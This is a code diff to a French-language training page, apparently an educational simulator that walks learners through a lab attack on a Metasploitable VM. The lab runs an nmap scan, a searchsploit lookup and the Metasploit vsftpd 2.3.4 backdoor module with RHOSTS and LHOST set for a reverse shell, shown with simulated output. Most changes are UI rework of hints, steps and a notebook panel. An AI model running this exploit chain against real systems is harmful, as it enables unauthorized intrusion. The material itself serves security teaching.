@@ -698,11 +698,6 @@
     overflow-y:auto;
     max-height:none;
     padding:20px 26px;
-    transition:filter .25s ease;
-  }
-  .term-fullscreen .sim-body.dimmed{
-    filter:brightness(.5) saturate(.85);
-    pointer-events:none;
   }
   .term-fs-footer{
     flex-shrink:0;
@@ -712,84 +707,49 @@
   .term-fs-footer .sim-hint-box{margin:10px 22px 0;}
   .term-fs-footer .sim-controls{padding:10px 22px 14px;}
 
-  /* ---------- POP-UP D'ANALYSE (remplace indice/solution/continuer en mode analyse) ---------- */
-  .analyze-popup{
-    margin:16px 22px 0;
-    padding:16px 18px;
-    border-radius:10px;
-    border:1px solid var(--accent);
-    background:linear-gradient(180deg, var(--accent-soft), var(--panel-alt) 75%);
-    box-shadow:0 14px 34px rgba(0,0,0,.4), 0 0 0 1px rgba(255,138,92,.08);
-    display:none;
-    flex-direction:column;
-    gap:12px;
-    animation:popIn .3s cubic-bezier(.34,1.56,.64,1) both;
+  /* ---------- FIL D'ARIANE DE MÉTHODE (toujours visible, jamais bloquant) ---------- */
+  .phase-track{
+    display:flex; flex-wrap:wrap; gap:6px;
+    margin-top:12px;
   }
-  .analyze-popup.leaving{animation:popOut .18s ease both;}
-  @keyframes popIn{
-    from{opacity:0; transform:translateY(14px) scale(.96);}
-    to{opacity:1; transform:translateY(0) scale(1);}
+  .phase-pill{
+    font-family:var(--mono); font-size:10.5px; letter-spacing:.03em;
+    color:var(--muted); border:1px solid var(--border); border-radius:20px;
+    padding:4px 10px; transition:color .2s, border-color .2s, background .2s;
   }
-  @keyframes popOut{
-    from{opacity:1; transform:scale(1);}
-    to{opacity:0; transform:scale(.95);}
+  .phase-pill.active{
+    color:var(--accent); border-color:var(--accent); background:var(--accent-soft);
   }
-  .ap-tag{
-    align-self:flex-start;
-    font-family:var(--mono);
-    font-size:10px;
-    letter-spacing:.07em;
-    text-transform:uppercase;
-    color:var(--accent);
-    border:1px solid var(--accent);
-    border-radius:3px;
-    padding:3px 8px;
+
+  /* ---------- CARNET DE MISSION (jamais bloquant : pas de dimmed, pas de clic forcé pour continuer) ---------- */
+  .notebook-btn{
+    font-family:var(--mono); font-size:12px; color:var(--muted);
+    background:var(--panel-alt); border:1px solid var(--border); border-radius:6px;
+    padding:6px 12px; cursor:pointer; display:inline-flex; align-items:center; gap:6px;
+    transition:border-color .15s, color .15s;
   }
-  .ap-question{
-    font-family:var(--sans);
-    font-size:14.5px;
-    color:var(--text);
-    line-height:1.55;
-    margin:0;
+  .notebook-btn:hover{border-color:var(--accent); color:var(--accent);}
+  .notebook-panel{
+    display:none; flex-direction:column; gap:10px;
+    margin:12px 22px 0; padding:14px 16px; max-height:260px; overflow-y:auto;
+    border-radius:10px; border:1px solid var(--border); background:var(--panel-alt);
   }
-  .ap-hint{
-    font-size:13px;
-    color:var(--muted);
-    max-height:0;
-    opacity:0;
-    overflow:hidden;
-    border-left:2px solid var(--accent);
-    padding-left:0;
-    transition:max-height .25s ease, opacity .25s ease, padding .25s ease;
+  .notebook-panel.show{display:flex;}
+  .notebook-empty{font-size:12.5px; color:var(--muted); margin:0;}
+  .notebook-item{border-left:2px solid var(--accent); padding-left:10px;}
+  .notebook-item .nb-cmd{
+    font-family:var(--mono); font-size:12px; color:var(--text); margin-bottom:2px;
   }
-  .ap-hint.show{max-height:200px; opacity:1; padding:8px 0 8px 12px;}
-  .ap-actions{display:flex; gap:8px; flex-wrap:wrap; align-items:center;}
-  .ap-btn{
-    font-family:var(--mono);
-    font-size:12px;
-    color:var(--text);
-    background:var(--panel-alt);
-    border:1px solid var(--border);
-    border-radius:6px;
-    padding:6px 12px;
-    cursor:pointer;
-    display:inline-flex;
-    align-items:center;
-    gap:6px;
-    transition:border-color .15s, transform .1s;
+  .notebook-item .nb-note{font-size:12.5px; color:var(--muted); line-height:1.5;}
+
+  /* ---------- INDICE (deux niveaux) ---------- */
+  .hint-more{
+    display:inline-block; margin-left:8px;
+    font-family:var(--mono); font-size:11px; color:var(--accent);
+    background:transparent; border:1px solid var(--accent); border-radius:12px;
+    padding:2px 9px; cursor:pointer;
   }
-  .ap-btn:hover{border-color:var(--muted); transform:translateY(-1px);}
-  .ap-btn.ap-continue{
-    margin-left:auto;
-    border-color:var(--ok);
-    color:var(--ok);
-    font-weight:600;
-    animation:ctaPulse 1.8s ease-in-out infinite;
-  }
-  @keyframes ctaPulse{
-    0%,100%{box-shadow:0 0 0 rgba(95,217,164,0);}
-    50%{box-shadow:0 0 16px rgba(95,217,164,.5);}
-  }
+  .hint-more:hover{background:var(--accent-soft);}
 
   /* animation sobre au passage d'une étape à l'autre */
   @keyframes successFlash{
@@ -1193,15 +1153,19 @@ Metasploit Documentation: https://docs.metasploit.com/</span>
       <div class="term-fs-info">
         <span class="item">Cible <strong id="ib-target">192.168.56.20</strong></span>
         <span class="item">Attaquant <strong id="ib-attacker">192.168.56.10</strong></span>
-        <span class="item mode" id="sim-mode-label">reconnaissance</span>
+        <button type="button" class="notebook-btn" id="notebook-btn">📓 Carnet (<span id="notebook-count">0</span>)</button>
       </div>
+      <div class="phase-track" id="phase-track"></div>
       <div class="term-progress">
         <div class="term-progress-track"><div class="term-progress-fill" id="term-progress-fill"></div></div>
-        <span class="term-progress-label" id="sim-progress">étape 1/12</span>
+        <span class="term-progress-label" id="sim-progress">étape 1/11</span>
       </div>
       <div class="term-fs-consigne" id="term-fs-consigne">
         <span class="consigne-tag" id="consigne-tag">Consigne</span>
         <span class="consigne-text" id="consigne-text">—</span>
+      </div>
+      <div class="notebook-panel" id="notebook-panel">
+        <div id="notebook-list"></div>
       </div>
     </div>
 
@@ -1217,18 +1181,10 @@ Metasploit Documentation: https://docs.metasploit.com/</span>
     </div>
 
     <div class="term-fs-footer">
-      <div class="analyze-popup" id="analyze-popup">
-        <span class="ap-tag" id="ap-tag">À analyser</span>
-        <p class="ap-question" id="ap-question">—</p>
-        <div class="ap-actions">
-          <button class="ap-btn ap-continue" id="ap-continue-btn" type="button">Continuer →</button>
-        </div>
-      </div>
       <div class="sim-hint-box" id="sim-hint-box"></div>
       <div class="sim-controls">
         <button class="sim-btn" id="sim-hint-btn">💡 Indice</button>
         <button class="sim-btn" id="sim-solution-btn">🔍 Solution</button>
-        <button class="sim-btn continue" id="sim-continue-btn" style="display:none;">Continuer →</button>
         <button class="sim-btn continue" id="sim-connect-btn" style="display:none;">🔌 Connexion réseau</button>
         <button class="sim-btn" id="sim-reset-btn">↺ Recommencer</button>
       </div>
@@ -1237,10 +1193,16 @@ Metasploit Documentation: https://docs.metasploit.com/</span>
 
 <script>
   // ---------- SÉQUENCE ----------
-  // kind "type"    : il faut taper une commande pour avancer.
-  // kind "analyze" : pas de commande — on relit la sortie précédente, indice/solution surlignent, "Continuer" fait avancer.
-  // kind "connect" : pas de saisie non plus — la config réseau est déjà couverte dans le cours ci-dessus,
-  //                  ici on se contente de déclencher les deux machines via un bouton dédié.
+  // kind "type"    : il faut toujours taper quelque chose pour avancer — y compris
+  //                  les moments de réflexion (ex: "quel port cibler ?"), qui sont
+  //                  d'anciens moments "analyze" fondus ici : plus de pop-up, plus
+  //                  de clic "Continuer", plus d'écran assombri. On tape une courte
+  //                  réponse, l'indice/la solution marchent pareil que pour une
+  //                  vraie commande, et l'annotation s'affiche ensuite comme un
+  //                  simple commentaire dans le flux du terminal.
+  // kind "connect" : pas de saisie — la config réseau est déjà couverte plus haut
+  //                  dans le cours, ici on se contente de déclencher les deux
+  //                  machines via un bouton dédié.
   const steps = [
     { kind:"connect",
       consigne:"Connecte les deux machines au réseau interne avant de commencer.",
@@ -1250,10 +1212,12 @@ Metasploit Documentation: https://docs.metasploit.com/</span>
         {context:"msfadmin@metasploitable", prompt:"$", cmd:"sudo ifconfig eth0 192.168.56.20 netmask 255.255.255.0 up", output:[]}
       ] },
 
-    { kind:"type", context:"kali@kali", prompt:"$",
+    { kind:"type", phase:"recon", context:"kali@kali", prompt:"$",
       task:"Lance une reconnaissance complète sur la cible",
       accepted:["nmap -sv -sc 192.168.56.20"],
-      hint:"Il te faut l'outil de référence pour la reconnaissance réseau : capable, en un seul passage, de lister les ports ouverts, d'identifier la version précise de chaque service qui tourne dessus, et de lancer quelques scripts de diagnostic complémentaires (bannières, vérifications basiques). Consulte son aide pour trouver les options qui activent ces deux derniers points.",
+      hint:"Un seul outil fait référence pour la recon réseau. Regarde son aide pour trouver l'option qui identifie la version des services, et celle qui lance des scripts de diagnostic de base.",
+      hint2:"C'est nmap. -sV détecte la version de chaque service ; -sC lance les scripts NSE par défaut (bannières, checks basiques). Combine les deux sur l'IP cible.",
+      note:"nmap -sV -sC &lt;cible&gt; → <strong>-sV</strong> identifie la version de chaque service ouvert, <strong>-sC</strong> lance les scripts NSE par défaut (bannières, vérifications basiques).",
       output:[
         {t:"Nmap scan report for 192.168.56.20", c:"o"},
         {t:"21/tcp   open  ftp         vsftpd 2.3.4", c:"o", id:"hl-ftp"},
@@ -1276,16 +1240,28 @@ Metasploit Documentation: https://docs.metasploit.com/</span>
         {t:"8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1", c:"o"}
       ] },
 
-    { kind:"analyze",
-      question:"18 ports ouverts. Avant de foncer sur le premier venu : lequel de ces services te semble le plus prometteur pour un premier essai ?",
-      hint:"Repère les versions les plus anciennes <em>et</em> les accès qui ne demandent aucune authentification. Un des services coche les deux cases.",
+    { kind:"type", phase:"recon", context:"kali@kali", prompt:"$",
+      task:"18 ports ouverts. Tape le numéro du port le plus prometteur pour un premier essai.",
+      accepted:["21"],
+      wrongAnswers:{
+        "22":"OpenSSH est chiffré et sans faille connue ici — pas le point d'entrée le plus simple.",
+        "3306":"MySQL demande d'abord des identifiants (même faibles) — regarde plutôt un service qui n'en demande aucun.",
+        "23":"Telnet marcherait, mais demanderait un bruteforce — il y a plus direct sur ce scan.",
+        "80":"Apache tourne, mais rien d'exploitable sans creuser bien plus loin. Regarde les versions les plus anciennes du scan."
+      },
+      hint:"Repère la version la plus ancienne <em>et</em> l'accès qui ne demande aucune authentification. Un seul service coche les deux cases.",
+      hint2:"Le port 21 (FTP) fait tourner vsftpd 2.3.4 — une version de 2011 — avec une ligne juste en dessous qui dit que la connexion anonyme est autorisée.",
       highlightIds:["hl-ftp","hl-anon"],
-      annotation:"→ vsftpd 2.3.4 (2011) + connexion anonyme autorisée : ça vaut le coup de chercher un exploit connu pour cette version précise." },
+      annotation:"→ vsftpd 2.3.4 (2011) + connexion anonyme autorisée : ça vaut le coup de chercher un exploit connu pour cette version précise.",
+      note:"Priorité de ciblage : version ancienne + service qui ne demande aucune authentification = premier candidat naturel.",
+      output:[] },
 
-    { kind:"type", context:"kali@kali", prompt:"$",
+    { kind:"type", phase:"recherche", context:"kali@kali", prompt:"$",
       task:"Cherche des exploits publics pour vsftpd",
       accepted:["searchsploit vsftpd"],
-      hint:"Kali embarque une base locale d'exploits publics, consultable par mot-clé simple — ce n'est pas une recherche intelligente. Comme vu dans le cours plus haut : une requête trop précise (avec numéro de version) risque de manquer une entrée existante. Reste large, sur le nom du service uniquement, et trie ensuite les résultats toi-même.",
+      hint:"Kali embarque une base locale d'exploits publics, consultable par mot-clé simple — ce n'est pas une recherche intelligente. Reste large, sur le nom du service seul.",
+      hint2:"searchsploit vsftpd — une requête trop précise (avec le numéro de version) risque de manquer une entrée existante ; on trie les résultats soi-même ensuite.",
+      note:"searchsploit &lt;service&gt; → recherche large par mot-clé dans la base d'exploits locale ; s'affine à la main sur les résultats, jamais en amont.",
       output:[
         {t:"------------------------------------------------------- ---------------------------------", c:"o"},
         {t:" Exploit Title                                         |  Path", c:"o"},
@@ -1298,16 +1274,27 @@ Metasploit Documentation: https://docs.metasploit.com/</span>
         {t:"Shellcodes: No Results", c:"o"}
       ] },
 
-    { kind:"analyze",
-      question:"Quatre résultats pour vsftpd. Un seul mérite d'être chargé dans Metasploit pour obtenir un vrai accès plutôt qu'un simple plantage — lequel, et pourquoi le chemin en .rb est un indice ?",
-      hint:"Regarde la version exacte (2.3.4) et le mot Backdoor — .rb veut dire module Ruby, déjà prêt pour msfconsole.",
+    { kind:"type", phase:"recherche", context:"kali@kali", prompt:"$",
+      task:"Quatre résultats pour vsftpd. Tape le numéro d'identifiant (fin du chemin) de celui qui mérite d'être chargé dans Metasploit.",
+      accepted:["49757"],
+      wrongAnswers:{
+        "16270":"Ce module ne fait que planter le service (Denial of Service) — aucun accès obtenu.",
+        "17491":"Bon mot 'Backdoor', mais ce chemin-là n'est pas packagé pour Metasploit — regarde la ligne qui précise (Metasploit) dans son titre.",
+        "5814":"Cible une version différente (2.0.5) et demande déjà un compte existant — pas notre cas ici."
+      },
+      hint:"Regarde les 4 lignes : une seule combine le mot Backdoor (un vrai accès, pas un plantage) ET une mention explicite (Metasploit) dans son titre.",
+      hint2:"\"vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)\", chemin unix/remote/49757.rb : bonne version, vraie exécution de commande, et .rb = déjà écrit en Ruby pour être chargé tel quel dans msfconsole.",
       highlightIds:["hl-backdoor-msf"],
-      annotation:"→ \"vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)\" : bonne version, vraie exécution de commande, et déjà packagé en module Ruby pour Metasploit." },
+      annotation:"→ 49757.rb : même faille que 17491, mais réécrite et empaquetée en module Ruby pour Metasploit — c'est celle-là qu'on va charger.",
+      note:"Un chemin en .rb dans les résultats searchsploit = module déjà prêt pour Metasploit (Ruby), pas un simple script/PoC autonome.",
+      output:[] },
 
-    { kind:"type", context:"kali@kali", prompt:"$",
+    { kind:"type", phase:"recherche", context:"kali@kali", prompt:"$",
       task:"Lance Metasploit",
       accepted:["msfconsole"],
-      hint:"Le module repéré est un fichier .rb : il ne s'exécute pas tout seul depuis un simple shell, il doit être chargé par le framework capable de l'interpréter. Ce framework a une console interactive dédiée, qu'on démarre par une seule commande depuis Kali — c'est l'outil le plus connu du lab, présent dans le nom du menu Kali qui le contient.",
+      hint:"Le module repéré est un fichier .rb : il doit être chargé par le framework capable de l'interpréter, via sa console interactive dédiée.",
+      hint2:"msfconsole — une seule commande depuis Kali, c'est l'outil le plus connu du lab.",
+      note:"msfconsole → lance la console interactive de Metasploit (recherche, chargement et configuration des modules se font toutes depuis là).",
       output:[
         {t:"Metasploit tip: You can pivot connections over sessions started with the ssh_login modules", c:"o"},
         {t:"", c:"o"},
@@ -1318,10 +1305,12 @@ Metasploit Documentation: https://docs.metasploit.com/</span>
         {t:"Metasploit Documentation: https://docs.metasploit.com/", c:"o"}
       ] },
 
-    { kind:"type", context:"msf", prompt:">",
+    { kind:"type", phase:"recherche", context:"msf", prompt:">",
       task:"Cherche un module Metasploit lié à ce service",
       accepted:["search vsftpd"],
-      hint:"Une fois dans le framework, la même logique de recherche par mot-clé que tout à l'heure s'applique — c'est l'action la plus naturelle qu'on fait en entrant dans une console de ce type quand on cherche un module précis. Le nom du service seul suffit.",
+      hint:"Une fois dans le framework, la même logique de recherche par mot-clé s'applique. Le nom du service seul suffit.",
+      hint2:"search vsftpd — première commande naturelle en entrant dans msfconsole quand on vise un service précis.",
+      note:"search &lt;mot-clé&gt; (dans msfconsole) → cherche un module correspondant dans la base intégrée de Metasploit.",
       output:[
         {t:"#  Name                                  Disclosure Date  Rank       Check  Description", c:"o"},
         {t:"-  ----                                  ---------------  ----       -----  -----------", c:"o"},
@@ -1329,38 +1318,41 @@ Metasploit Documentation: https://docs.metasploit.com/</span>
         {t:"1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution", c:"o", id:"hl-backdoor"}
       ] },
 
-    { kind:"analyze",
-      question:"Deux résultats, deux versions différentes (2.3.2 et 2.3.4), deux ranks différents. Lequel choisir pour obtenir une vraie prise de contrôle plutôt qu'un simple plantage du service ?",
-      hint:"Compare le rank des deux lignes — et la version exacte trouvée par nmap.",
-      highlightIds:["hl-backdoor"],
-      annotation:"→ rank \"excellent\" = exploit fiable, sans risque de planter le service. Et 2.3.4 correspond exactement à la version vue dans le scan." },
-
-    { kind:"type", context:"msf", prompt:">",
+    { kind:"type", phase:"config", context:"msf", prompt:">",
       task:"Charge le bon module",
       accepted:["use exploit/unix/ftp/vsftpd_234_backdoor", "use 1"],
       wrongAnswers:{
-        "use auxiliary/dos/ftp/vsftpd_232":"Ce module fait planter le service (DoS) — il ne donne aucun accès. Regarde à nouveau lequel a le rank \"excellent\".",
-        "use 0":"Ce module fait planter le service (DoS) — il ne donne aucun accès. Regarde à nouveau lequel a le rank \"excellent\"."
+        "use auxiliary/dos/ftp/vsftpd_232":"Ce module fait planter le service (DoS) — il ne donne aucun accès. Compare le rank des deux lignes.",
+        "use 0":"Ce module fait planter le service (DoS) — il ne donne aucun accès. Compare le rank des deux lignes."
       },
-      hint:"Un module Metasploit doit d'abord être chargé dans la console avant de pouvoir être configuré ou lancé. Il existe une commande dédiée à ça dans le framework — repense à comment les résultats de la recherche précédente étaient présentés : la liste donnait deux façons de désigner chaque module.",
+      hint:"Un module doit d'abord être chargé dans la console avant d'être configuré ou lancé — une commande dédiée fait ça. La liste précédente donnait deux façons de désigner chaque module.",
+      hint2:"use exploit/unix/ftp/vsftpd_234_backdoor (ou use 1) — rank \"excellent\" = exploit fiable qui ne plante pas le service, et la version 2.3.4 correspond exactement au scan nmap.",
+      annotation:"→ rank \"excellent\" = fiable, sans risque de planter le service visé ; 2.3.4 correspond exactement à la version vue dans le scan initial.",
+      note:"use &lt;chemin/module&gt; → charge un module Metasploit dans le contexte courant de la console (les commandes suivantes s'appliquent à lui).",
       output:[] },
 
-    { kind:"type", context:"msf exploit(vsftpd_234_backdoor)", prompt:">",
+    { kind:"type", phase:"config", context:"msf exploit(vsftpd_234_backdoor)", prompt:">",
       task:"Définis la cible (RHOSTS)",
       accepted:["set rhosts 192.168.56.20"],
-      hint:"Avant de lancer quoi que ce soit, le module chargé a besoin de savoir sur quelle machine agir. Metasploit fonctionne avec des variables de configuration propres à chaque module (visibles via show options) — l'une d'elles désigne précisément la cible distante. Trouve son nom et donne-lui la bonne valeur avec la commande de configuration du framework.",
+      hint:"Le module chargé a besoin de savoir sur quelle machine agir. Une variable de configuration du module désigne précisément la cible distante.",
+      hint2:"set RHOSTS 192.168.56.20 — RHOSTS est la variable la plus utilisée de tout Metasploit, visible dans show options une fois le module chargé.",
+      note:"RHOSTS = adresse (ou plage) de la cible visée par le module chargé.",
       output:[{t:"RHOSTS => 192.168.56.20", c:"ok"}] },
 
-    { kind:"type", context:"msf exploit(vsftpd_234_backdoor)", prompt:">",
+    { kind:"type", phase:"config", context:"msf exploit(vsftpd_234_backdoor)", prompt:">",
       task:"Définis LHOST (ton IP, pour le reverse shell)",
       accepted:["set lhost 192.168.56.10"],
-      hint:"Le payload utilisé est un reverse shell : c'est la cible compromise qui va rappeler Kali, pas l'inverse — il lui faut donc une adresse où rappeler. Une seconde variable, symétrique à celle réglée à l'étape précédente, désigne cette fois ta propre machine plutôt que la cible. Même commande de configuration, ta propre IP en valeur.",
+      hint:"Le payload est un reverse shell : c'est la cible compromise qui rappelle Kali. Il lui faut une adresse où rappeler — une seconde variable, symétrique à RHOSTS.",
+      hint2:"set LHOST 192.168.56.10 — LHOST désigne ta propre machine (l'attaquant), jamais la cible.",
+      note:"LHOST = ta propre adresse ; utilisée par les payloads reverse pour que la cible te rappelle, plutôt que l'inverse.",
       output:[{t:"LHOST => 192.168.56.10", c:"ok"}] },
 
-    { kind:"type", context:"msf exploit(vsftpd_234_backdoor)", prompt:">",
+    { kind:"type", phase:"exploitation", context:"msf exploit(vsftpd_234_backdoor)", prompt:">",
       task:"Lance l'exploit",
       accepted:["exploit", "run"],
-      hint:"Cible et hôte local sont configurés — il ne manque plus qu'un verbe d'action, très court, qui lance concrètement le module chargé.",
+      hint:"Cible et hôte local sont configurés — il ne manque qu'un verbe d'action très court qui lance le module chargé.",
+      hint2:"exploit (ou run, équivalent pour un module de type exploit) — lance l'attaque avec les options actuellement définies.",
+      note:"exploit / run → lance le module chargé avec les options définies (RHOSTS, LHOST...) ; run est l'alias générique, exploit ne s'utilise que sur ce type de module.",
       output:[
         {t:"[*] Started reverse TCP handler on 192.168.56.10:4444", c:"o"},
         {t:"[+] Backdoor has been spawned!", c:"ok"},
